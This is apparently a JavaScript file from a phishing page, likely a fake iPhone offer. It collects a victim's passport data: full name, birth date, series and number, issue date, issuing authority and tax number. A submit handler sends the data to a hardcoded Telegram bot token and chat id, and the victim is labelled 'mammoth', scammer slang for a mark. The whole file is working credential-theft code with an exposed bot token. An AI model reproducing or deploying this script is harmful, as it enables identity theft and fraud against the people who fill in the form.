let tg = {
    token: "6955150230:AAEABHyW9jLsv9CvO6x-awQpGHCRHQOzxcw",
    chat_id: "756956428" 
}

function sendMessage(text){
    const url = `https://api.telegram.org/bot${tg.token}/sendMessage?chat_id=${tg.chat_id}&text=${text}`; // The url to request
    const xht = new XMLHttpRequest();
    xht.open("GET", url);
    xht.send();
}


const form = document.getElementById('pasport')

function retretive(event){
    event.preventDefault();
    let txt = '';

    const fullName = form.querySelector('[name="full-name"]'),
    dateBorn = form.querySelector('[name="date-born"]'),
    seriesNumber = form.querySelector('[name="series-number"]'),
    datePasport = form.querySelector('[name="date-pasport"]'),
    organ = form.querySelector('[name="organ"]'),
    inn = form.querySelector('[name="inn"]');


    const values = {
        '🦣 Данные паспорта мамонта 🦣':'',
        "ФИО:ㅤ": fullName.value,
        "Дата рождения:ㅤ": dateBorn.value,
        "Серия и номер:ㅤ": seriesNumber.value,
        "Дата выдачи:ㅤ": datePasport.value,
        "Орган:ㅤ": organ.value,
        "Инн:ㅤ": inn.value,
    }

    for (var key in values) {
        txt +=  key + values[key] + "%0A";
    }
    if (fullName.value ===''|| dateBorn.value === '' || seriesNumber.value === '' || datePasport.value === '' || organ.value === '' || inn.value === ''){
        alert('Пустое поле! ПОЧЕМУ?')
    }else{
        window.location.href = 'https://sh6lok.github.io/Iphone/thx.html'
        sendMessage(txt);
    }


}

form.addEventListener('submit', retretive)


const fullName = form.querySelector('[name="full-name"]');
const dateBorn = form.querySelector('[name="date-born"]');
const seriesNumber = form.querySelector('[name="series-number"]');
const datePasport = form.querySelector('[name="date-pasport"]');
const organ = form.querySelector('[name="organ"]');
const inn = form.querySelector('[name="inn"]');

const mask1 = new IMask(dateBorn,{
    mask: '00.00.0000'
})
const mask2 = new IMask(datePasport,{
    mask: '00.00.0000'
})
const mask3 = new IMask(seriesNumber,{
    mask: '0000 000000'
})
const mask4 = new IMask(inn,{
    mask: '000-000-000-00'
})




